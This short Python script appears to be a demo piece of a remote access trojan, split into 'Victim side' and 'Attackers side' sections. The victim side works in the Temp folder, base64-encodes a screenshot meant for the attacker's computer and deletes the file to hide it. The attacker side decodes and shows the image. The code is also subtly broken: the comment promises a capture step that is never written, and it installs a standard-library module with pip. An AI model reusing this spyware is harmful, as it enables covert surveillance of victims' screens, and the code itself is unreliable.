#Victim side
import os
try:
    import mss, base64
except:
    os.system("pip install mss base64")
    import mss, base64


 #creates the image and saves it in the temp folder as 'image.png'

os.chdir(os.getenv("TEMP"))#navigates the scripts working directory to the Temp folder

with open("image.png", "rb") as image:#opens the image as a variable
    b64string = base64.b64encode(image.read())#converts the image into a base64 format, in the actual rat this will be sent to the attacking computer
    
os.system(f"DEL image.png")#deletes the image


#Attackers side
try:
    from PIL import Image
except:
    os.system("pip install pillow")
    from PIL import Image
import io
image = b64string #saves the image string as a variable
f = io.BytesIO(base64.b64decode(image)) #converts the string back into an image and saves it to the variable 'f'
pilimage = Image.open(f) #uses pillow to open the image
pilimage.show() #shows the image